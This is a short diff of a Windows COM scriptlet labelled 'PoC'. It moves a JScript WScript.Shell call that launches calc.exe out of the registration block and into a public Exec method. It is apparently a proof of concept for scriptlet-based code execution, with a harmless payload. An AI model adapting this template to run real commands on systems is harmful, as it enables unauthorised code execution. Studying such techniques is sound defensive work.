@@ -3,10 +3,15 @@
 <registration
     progid="PoC"
     classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
-    <script language="JScript">
-        <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-        ]]>
-</script>
 </registration>
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+    function Exec() {
+        new ActiveXObject("WScript.Shell").Run("calc.exe");
+    }
+]]>
+</script>
 </scriptlet>
